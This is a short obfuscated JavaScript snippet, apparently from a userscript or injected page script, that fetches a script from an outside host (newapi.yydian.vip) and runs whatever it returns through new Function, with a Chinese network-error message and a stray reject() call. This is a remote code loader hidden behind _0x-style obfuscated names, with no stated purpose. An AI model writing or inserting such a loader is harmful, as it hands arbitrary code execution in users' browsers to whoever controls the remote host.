
fetch("https://newapi.yydian.vip/weidao/new/dmj/js/popup.js").then(_0x15c71e => {
  if (!_0x15c71e.ok) throw new Error("请检查网络是否OK");
  return _0x15c71e.text();
}).then(_0x321032 => {
  const _0x555f2f = new Function(_0x321032);
  _0x555f2f();
}).catch(_0x12e0c6 => {
  reject();
});